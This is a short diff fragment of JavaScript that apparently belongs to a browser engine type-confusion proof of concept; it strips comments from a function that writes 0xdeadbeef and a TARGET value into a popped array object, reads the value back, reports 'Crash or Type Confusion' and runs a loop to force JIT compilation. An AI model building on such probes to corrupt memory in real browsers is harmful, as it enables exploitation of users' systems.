@@ -261,15 +261,15 @@ function v7(v8, v9) {
     }
     const v11 = v4.pop();
     try {
-        v11[0] = 0xdeadbeef; // الكتابة
+        v11[0] = 0xdeadbeef; 
         alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
-        v11[1] = TARGET; // محاولة كتابة TARGET
-        let readValue = v11[0]; // القراءة
+        v11[1] = TARGET; 
+        let readValue = v11[0]; 
         alert('Read from v11[0] = ' + readValue.toString(16));
     } catch (e) {
         alert('Crash or Type Confusion: ' + e);
     }
-    for (let v15 = 0; v15 < 100; v15++) {} // Force JIT
+    for (let v15 = 0; v15 < 100; v15++) {}
 }
 
 var p = {};
